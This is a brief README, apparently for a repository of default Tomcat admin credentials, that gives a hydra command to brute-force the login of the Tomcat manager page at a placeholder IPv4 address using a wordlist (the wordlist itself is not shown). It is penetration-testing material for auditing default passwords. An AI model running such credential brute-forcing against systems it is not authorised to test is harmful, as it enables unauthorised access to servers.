# tomcat_creds
Default credentials in tomcat for the admin user

Create a file named wordlist.txt and copy and paste the content into.

If using hydra:  hydra -L admin -P wordlist.txt -f *IPV4* http-get /manager/html
